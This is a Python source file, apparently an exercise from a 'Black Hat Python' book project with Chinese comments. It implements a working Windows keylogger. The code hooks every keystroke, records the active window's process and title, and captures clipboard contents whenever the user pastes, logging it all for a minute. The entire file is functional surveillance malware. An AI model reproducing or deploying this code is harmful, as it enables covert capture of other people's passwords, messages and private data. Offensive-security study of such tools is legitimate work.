#!/usr/bin/env python
# encoding: utf-8
"""
@file: keylogger.py
@time: 2022/5/25 13:56
@project: black-hat-python-2ed
@desc: P151 键盘记录，
在Windows下运行时，需要将venv/Lib/site-packages/pywin32_system32目录下的pythoncom38.dll、pywintypes38.dll复制到C:\Windows\System32里面
"""
import sys
import time
from ctypes import windll, c_ulong, byref, create_string_buffer
from io import StringIO
import pythoncom
import win32clipboard
import pyWinhook as pyHook

# 设置抓取1分钟
TIMEOUT = 60 * 1


class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        # 获取活跃窗口
        hwnd = windll.user32.GetForegroundWindow()
        # 获取窗口对应的进程ID
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f"{pid.value}"

        executable = create_string_buffer(512)
        # 打开进程
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        # 利用打开的进程句柄，找到进程实际的程序名
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

        # 抓取窗口标题
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            # 由于Windows是GBK的编码，设置成gbk
            self.current_window = window_title.value.decode('gbk')
        except UnicodeDecodeError as e:
            print(f"{e}: window name nuknown")

        # 将所有抓取到的所有信息打印出来
        print('\n', process_id, executable.value.decode(), self.current_window)
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def mykeystorke(self, event):
        # 检查用户是否切换了窗口
        if event.WindowName != self.current_window:
            self.get_current_process()
        # 判断按键是否为可打印的字符
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            # 检查用户是否进行粘贴操作
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f"[PASTE] - {value}")
            else:
                print(f"{event.Key}")
        return True


def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    kl = KeyLogger()
    hm = pyHook.HookManager()
    # 将KeyDown事件绑定到mykeystorky的回调函数中
    hm.KeyDown = kl.mykeystorke
    # 钩住所有的按键事件
    hm.HookKeyboard()
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log


if __name__ == '__main__':
    print(run())
    print('done.')
